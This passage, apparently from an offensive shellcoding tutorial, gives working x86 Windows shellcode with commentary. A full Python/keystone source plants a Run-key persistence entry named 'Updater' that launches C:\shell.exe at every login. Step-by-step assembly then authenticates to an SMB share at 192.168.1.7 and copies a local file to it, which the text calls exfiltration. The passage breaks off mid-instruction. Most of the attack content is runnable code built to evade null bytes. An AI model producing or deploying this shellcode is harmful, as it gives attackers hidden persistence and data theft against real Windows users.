### Complete Registry Persistence Flow

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1702" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1702"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1702" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1702" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s1702)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1702)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1702)" font-weight="bold">Registry Persistence Pipeline</text>

  <rect x="25" y="50" width="120" height="45" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="85" y="68" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="bold">Resolve APIs</text>
  <text x="85" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">k32 + advapi32</text>
  <line x1="145" y1="72" x2="163" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1702)"/>

  <rect x="168" y="50" width="130" height="45" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="233" y="68" text-anchor="middle" fill="#ff6b35" font-size="9" font-weight="bold">RegOpenKeyExA</text>
  <text x="233" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">HKCU\...\Run</text>
  <line x1="298" y1="72" x2="316" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1702)"/>

  <rect x="321" y="50" width="140" height="45" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="391" y="68" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">RegSetValueExA</text>
  <text x="391" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">"Updater"→shell.exe</text>
  <line x1="461" y1="72" x2="479" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1702)"/>

  <rect x="484" y="50" width="110" height="45" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="539" y="68" text-anchor="middle" fill="#8b949e" font-size="9" font-weight="bold">RegCloseKey</text>
  <text x="539" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">cleanup</text>
  <line x1="594" y1="72" x2="612" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1702)"/>

  <rect x="617" y="50" width="100" height="45" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="667" y="68" text-anchor="middle" fill="#8b949e" font-size="9" font-weight="bold">ExitProcess</text>
  <text x="667" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">clean exit</text>

  <rect x="50" y="115" width="650" height="70" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="138" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Result: Auto-Start on Login</text>
  <text x="375" y="158" text-anchor="middle" fill="#e0e7ff" font-size="11">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</text>
  <text x="375" y="178" text-anchor="middle" fill="#8b949e" font-size="10">"Updater" = "C:\shell.exe" runs every time the user logs in</text>
</svg></div>

*Figure 17.2 -- Registry persistence pipeline. The shellcode creates a Run key entry so `C:\shell.exe` launches automatically on every user login.*

### Full Shellcode Source (`regper.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x0d                 ;"
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x14], eax           ;"
    "   push  0x73e2d87e                ;"  #   ExitProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x24], eax           ;"

    " load_advapi32:                     "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  0x6c6c642e                ;"  #   ".dll"
    "   push  0x32336970                ;"  #   "pi32"
    "   push  0x61766461                ;"  #   "adva"
    "   mov   esi, esp                  ;"
    "   push  esi                       ;"
    "   call  dword ptr [ebp+0x14]      ;"  #   LoadLibraryA("advapi32.dll")

    " resolve_symbols_advapi32:          "
    "   mov   ebx, eax                  ;"
    "   push  0xa84aeb81                ;"  #   RegOpenKeyExA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"
    "   push  0x2d1c9add                ;"  #   RegSetValueExA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x1C], eax           ;"
    "   push  0x35e273e6                ;"  #   RegCloseKey
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x20], eax           ;"

    " call_RegOpenKeyExA:                "
    "   xor   edx, edx                  ;"
    "   lea   edx, [ebp+0x28]           ;"
    "   xor   ebx, ebx                  ;"
    "   inc   ebx                       ;"
    "   inc   ebx                       ;"  #   KEY_SET_VALUE = 2
    "   xor   ecx, ecx                  ;"
    "   inc   ecx                       ;"
    "   shl   ecx, 0x1F                 ;"
    "   inc   ecx                       ;"  #   HKEY_CURRENT_USER = 0x80000001
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   al, 0x6e                  ;"
    "   push  eax                       ;"  #   "n\0\0\0"
    "   push  0x75525c6e                ;"  #   "n\Ru"
    "   push  0x6f697372                ;"  #   "rsio"
    "   push  0x6556746e                ;"  #   "ntVe"
    "   push  0x65727275                ;"  #   "urre"
    "   push  0x435c7377                ;"  #   "ws\C"
    "   push  0x6f646e69                ;"  #   "indo"
    "   push  0x575c7466                ;"  #   "ft\W"
    "   push  0x6f736f72                ;"  #   "roso"
    "   push  0x63694d5c                ;"  #   "\Mic"
    "   push  0x65726177                ;"  #   "ware"
    "   push  0x74666f53                ;"  #   "Soft"
    "   mov   edi, esp                  ;"
    "   push  edx                       ;"  #   phkResult
    "   push  ebx                       ;"  #   samDesired = 2
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   ulOptions = 0
    "   push  edi                       ;"  #   lpSubKey
    "   push  ecx                       ;"  #   hKey = HKCU
    "   call  dword ptr [ebp+0x18]      ;"  #   RegOpenKeyExA

    " call_RegSetValueExA:               "
    "   xor   ebx, ebx                  ;"
    "   add   ebx, 0x0D                 ;"  #   cbData = 13
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   push  0x6578652e                ;"  #   ".exe"
    "   push  0x6c6c6568                ;"  #   "hell"
    "   push  0x735c3a43                ;"  #   "C:\s"
    "   mov   edi, esp                  ;"  #   EDI = "C:\shell.exe"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x7265                ;"
    "   shl   eax, 0x08                 ;"
    "   mov   al, 0x74                  ;"  #   "ter\0"
    "   push  eax                       ;"
    "   push  0x61647055                ;"  #   "Upda"
    "   mov   esi, esp                  ;"  #   ESI = "Updater"
    "   xor   eax, eax                  ;"
    "   inc   eax                       ;"  #   REG_SZ = 1
    "   push  ebx                       ;"  #   cbData = 13
    "   push  edi                       ;"  #   lpData
    "   push  eax                       ;"  #   dwType = REG_SZ
    "   xor   ecx, ecx                  ;"
    "   push  ecx                       ;"  #   Reserved = 0
    "   push  esi                       ;"  #   lpValueName = "Updater"
    "   push  dword ptr [ebp+0x28]      ;"  #   hKey
    "   call  dword ptr [ebp+0x1C]      ;"  #   RegSetValueExA

    " call_RegCloseKey:                  "
    "   push  dword ptr [ebp+0x28]      ;"
    "   call  dword ptr [ebp+0x20]      ;"  #   RegCloseKey

    " call_ExitProcess:                  "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x24]      ;"  #   ExitProcess(0)
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```

### PoC Video

The following video demonstrates the registry persistence shellcode writing the Run key entry and verifying it in the registry:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/registry-persistence-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Registry persistence writing "Updater" to the HKCU Run key*

---

## 18. SMB File Operations: Network File Access

This shellcode demonstrates exfiltrating a file over SMB. It loads `mpr.dll`, establishes an authenticated connection to a remote SMB share using `WNetAddConnection2A`, then copies a local file to the share using `CopyFileA`.

### Step 1: Resolving kernel32.dll Functions

Three functions from `kernel32.dll`:

**LoadLibraryA** Hash: `0xec0e4e8e` → `[ebp+0x10]`. Loads mpr.dll.

**CopyFileA** `BOOL CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists)` Copies a file. Hash: `0x99ec895e` → `[ebp+0x14]`.

**ExitProcess** Hash: `0x73e2d87e` → `[ebp+0x18]`

> This shellcode uses split ROR-13 (`ror edx, 0x07; ror edx, 0x06`) to avoid the `0x0D` byte in the hash computation.

```nasm
resolve_symbols_kernel32:
    push  0xec0e4e8e              ; LoadLibraryA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x10], eax
    push  0x99ec895e              ; CopyFileA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x14], eax
    push  0x73e2d87e              ; ExitProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax
```

<div align="center"><svg viewBox="0 0 750 140" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1803" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1803"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1803" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="140" rx="10" fill="url(#bg_s1803)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1803)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1803)" font-weight="bold">kernel32.dll API Resolution (Split ROR-13)</text>
  <rect x="50" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="150" y="70" text-anchor="middle" fill="#00d4ff" font-size="11">LoadLibraryA → [ebp+0x10]</text>
  <rect x="275" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="70" text-anchor="middle" fill="#00ff88" font-size="11">CopyFileA → [ebp+0x14]</text>
  <rect x="500" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="600" y="70" text-anchor="middle" fill="#ff3366" font-size="11">ExitProcess → [ebp+0x18]</text>
  <rect x="50" y="100" width="650" height="28" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="119" text-anchor="middle" fill="#8b949e" font-size="10">Hash: ror edx, 0x07 ; ror edx, 0x06 (split 13-bit rotation avoids 0x0D byte)</text>
</svg></div>

*Figure 18.a -- kernel32 API resolution. Three functions resolved via split ROR-13 hashing.*

### Step 2: Loading mpr.dll

The Windows Multiple Provider Router (`mpr.dll`) provides network connection APIs:

```nasm
load_mpr_dll:
    xor   eax, eax
    push  eax                     ; null terminator
    xor   eax, eax
    mov   ax, 0x6c6c              ; "ll"
    shl   eax, 0x08
    mov   al, 0x64                ; → "dll\0"
    push  eax
    push  0x2e72706d              ; "mpr."
    mov   esi, esp                ; ESI = "mpr.dll"
    push  esi
    call  dword ptr [ebp+0x10]   ; LoadLibraryA("mpr.dll")
```

<div align="center"><svg viewBox="0 0 750 140" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1804" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1804"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1804" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1804" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="140" rx="10" fill="url(#bg_s1804)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1804)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1804)" font-weight="bold">Loading mpr.dll via LoadLibraryA</text>
  <rect x="60" y="50" width="120" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="120" y="72" text-anchor="middle" fill="#ff6b35" font-size="10">"mpr." DWORD</text>
  <line x1="180" y1="67" x2="198" y2="67" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1804)"/>
  <rect x="203" y="50" width="160" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="283" y="65" text-anchor="middle" fill="#ff6b35" font-size="10">shl trick → "dll\0"</text>
  <text x="283" y="80" text-anchor="middle" fill="#8b949e" font-size="9">0x6c6c << 8 | 0x64</text>
  <line x1="363" y1="67" x2="381" y2="67" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1804)"/>
  <rect x="386" y="50" width="150" height="35" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="461" y="72" text-anchor="middle" fill="#00d4ff" font-size="11">ESP → "mpr.dll"</text>
  <line x1="536" y1="67" x2="554" y2="67" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1804)"/>
  <rect x="559" y="50" width="150" height="35" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="634" y="72" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">LoadLibraryA</text>
  <rect x="60" y="100" width="650" height="28" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="385" y="119" text-anchor="middle" fill="#8b949e" font-size="10">EAX = mpr.dll base address (used for resolving WNetAddConnection2A)</text>
</svg></div>

*Figure 18.b -- mpr.dll loading. The "dll" suffix is built with shl to avoid null bytes.*

### Step 3: Resolving WNetAddConnection2A

**WNetAddConnection2A** `DWORD WNetAddConnection2A(LPNETRESOURCE lpNetResource, LPCSTR lpPassword, LPCSTR lpUserName, DWORD dwFlags)` Establishes an authenticated connection to a network resource. Hash: `0xd7d23576`.

```nasm
resolve_symbols_mpr_dll:
    mov   ebx, eax                ; EBX = mpr.dll base
    push  0xd7d23576              ; WNetAddConnection2A
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x1C], eax
```

<div align="center"><svg viewBox="0 0 750 100" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1805" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1805"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1805" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="100" rx="10" fill="url(#bg_s1805)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1805)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1805)" font-weight="bold">mpr.dll API Resolution</text>
  <rect x="150" y="48" width="200" height="35" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="250" y="63" text-anchor="middle" fill="#00d4ff" font-size="10">EBX = mpr.dll base</text>
  <text x="250" y="77" text-anchor="middle" fill="#8b949e" font-size="9">(from LoadLibraryA return)</text>
  <rect x="400" y="48" width="240" height="35" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="520" y="63" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">WNetAddConnection2A</text>
  <text x="520" y="77" text-anchor="middle" fill="#e0e7ff" font-size="10">0xd7d23576 → [ebp+0x1C]</text>
</svg></div>

*Figure 18.c -- WNetAddConnection2A resolved from mpr.dll's export table.*

### Step 4: Building the NETRESOURCE Struct

The `NETRESOURCE` struct (32 bytes) describes the SMB share connection. We zero it with `rep stosb` then fill the fields:

```nasm
netresource_struct_build:
    xor   eax, eax
    mov   al, 0x04
    add   al, 0x1c                ; 0x20 = 32 bytes
    xor   ecx, ecx
    mov   cl, al
    sub   esp, ecx
    mov   edi, esp
    push  ecx
    xor   eax, eax
    rep   stosb                   ; zero fill 32 bytes
    pop   ecx
    sub   edi, ecx                ; EDI = start of NETRESOURCE

    ; Build credentials and share path on stack
    ; "smbuser\0"
    ...
    mov   [ebp+0x20], esi        ; save username ptr
    ; "smbpass\0"
    ...
    mov   [ebp+0x24], esi        ; save password ptr
    ; "\\192.168.1.7\share\0"
    push  0x39315c5c              ; "\\19"
    push  0x36312e32              ; "2.16"
    push  0x2e312e38              ; "8.1."
    push  0x68735c37              ; "7\sh"
    ...
    mov   esi, esp                ; ESI = UNC path

netresource_struct_values:
    xor   eax, eax
    mov   dword ptr [edi], eax        ; dwScope = 0
    inc   eax
    mov   dword ptr [edi+0x04], eax   ; dwType = RESOURCETYPE_DISK (1)
    dec   eax
    mov   dword ptr [edi+0x08], eax   ; dwDisplayType = 0
    mov   dword ptr [edi+0x0C], eax   ; dwUsage = 0
    mov   dword ptr [edi+0x10], eax   ; lpLocalName = NULL
    mov   eax, esi
    mov   dword ptr [edi+0x14], eax   ; lpRemoteName = "\\192.168.1.7\share"
    xor   eax, eax
    mov   dword ptr [edi+0x18], eax   ; lpComment = NULL
    mov   dword ptr [edi+0x1C], eax   ; lpProvider = NULL
```

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1801" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1801"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1801" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="260" rx="10" fill="url(#bg_s1801)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1801)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1801)" font-weight="bold">NETRESOURCE Structure Layout</text>

  <rect x="50" y="48" width="160" height="35" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="130" y="70" text-anchor="middle" fill="#8b949e" font-size="10">dwScope = 0</text>
  <rect x="220" y="48" width="160" height="35" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="300" y="70" text-anchor="middle" fill="#00ff88" font-size="10">dwType = DISK (1)</text>
  <rect x="390" y="48" width="160" height="35" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="470" y="70" text-anchor="middle" fill="#8b949e" font-size="10">dwDisplayType = 0</text>
  <rect x="560" y="48" width="160" height="35" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="640" y="70" text-anchor="middle" fill="#8b949e" font-size="10">dwUsage = 0</text>

  <rect x="50" y="93" width="160" height="35" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="130" y="115" text-anchor="middle" fill="#8b949e" font-size="10">lpLocalName = NULL</text>
  <rect x="220" y="93" width="280" height="35" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="360" y="115" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">lpRemoteName → "\\192.168.1.7\share"</text>
  <rect x="510" y="93" width="100" height="35" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="560" y="115" text-anchor="middle" fill="#8b949e" font-size="10">lpComment=0</text>
  <rect x="620" y="93" width="100" height="35" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="670" y="115" text-anchor="middle" fill="#8b949e" font-size="10">lpProvider=0</text>

  <rect x="50" y="148" width="310" height="45" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="205" y="167" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Credentials</text>
  <text x="205" y="185" text-anchor="middle" fill="#e0e7ff" font-size="10">user: "smbuser" | pass: "smbpass"</text>

  <rect x="380" y="148" width="340" height="45" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="550" y="167" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">CopyFileA</text>
  <text x="550" y="185" text-anchor="middle" fill="#e0e7ff" font-size="10">"c:\proof.txt" → "\\192.168.1.7\share\proof.txt"</text>

  <rect x="50" y="210" width="670" height="35" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="385" y="232" text-anchor="middle" fill="#8b949e" font-size="10">WNetAddConnection2A authenticates to the share → CopyFileA copies the file over SMB</text>
</svg></div>

*Figure 18.1 -- NETRESOURCE structure and SMB file copy. The struct describes the remote share, WNetAddConnection2A authenticates, and CopyFileA exfiltrates the file.*

### Step 5: WNetAddConnection2A

```nasm
call_WNetAddConnection2A:
    xor   eax, eax
    push  eax                     ; dwFlags = 0
    push  dword ptr [ebp+0x20]  ; lpUserName = "smbuser"
    push  dword ptr [ebp+0x24]  ; lpPassword = "smbpass"
    push  edi                     ; lpNetResource = &NETRESOURCE
    call  dword ptr [ebp+0x1C]   ; WNetAddConnection2A
```

<div align="center"><svg viewBox="0 0 750 130" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1806" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1806"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1806" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="130" rx="10" fill="url(#bg_s1806)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1806)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1806)" font-weight="bold">WNetAddConnection2A Authenticate to SMB Share</text>
  <rect x="50" y="48" width="155" height="30" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="127" y="68" text-anchor="middle" fill="#8b949e" font-size="10">dwFlags = 0</text>
  <rect x="215" y="48" width="155" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="292" y="68" text-anchor="middle" fill="#00d4ff" font-size="10">user: "smbuser"</text>
  <rect x="380" y="48" width="155" height="30" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="457" y="68" text-anchor="middle" fill="#ff6b35" font-size="10">pass: "smbpass"</text>
  <rect x="545" y="48" width="170" height="30" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="630" y="68" text-anchor="middle" fill="#ff3366" font-size="10">&NETRESOURCE (EDI)</text>
  <rect x="50" y="92" width="665" height="28" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="382" y="111" text-anchor="middle" fill="#00ff88" font-size="10">Establishes authenticated connection to \\192.168.1.7\share</text>
</svg></div>

*Figure 18.d -- WNetAddConnection2A parameters. Authenticates to the remote share with credentials from the stack.*

### Step 6: CopyFileA

With the share connected, we build both paths on the stack and copy:

```nasm
call_CopyFileA:
    ; Build destination: "\\192.168.1.7\share\proof.txt"
    xor   eax, eax
    push  eax
    xor   eax, eax
    mov   al, 0x74                ; "t"
    push  eax                     ; "t\0\0\0"
    push  0x78742e66              ; "f.tx"
    push  0x6f6f7270              ; "proo"
    push  0x5c657261              ; "are\"
    push  0x68735c37              ; "7\sh"
    push  0x2e312e38              ; "8.1."
    push  0x36312e32              ; "2.16"
    push  0x39315c5c              ; "\\19"
    mov   esi, esp
    ; Build source: "c:\proof.txt"
    xor   eax, eax
    push  eax
    push  0x7478742e              ; ".txt"
    push  0x666f6f72              ; "roof"
    push  0x705c3a63              ; "c:\p"
    mov   ebx, esp
    xor   eax, eax
    push  eax                     ; bFailIfExists = FALSE
    push  esi                     ; lpNewFileName (remote)
    push  ebx                     ; lpExistingFileName (local)
    call  dword ptr [ebp+0x14]   ; CopyFileA

call_ExitProcess:
    xor   eax, eax
    push  eax
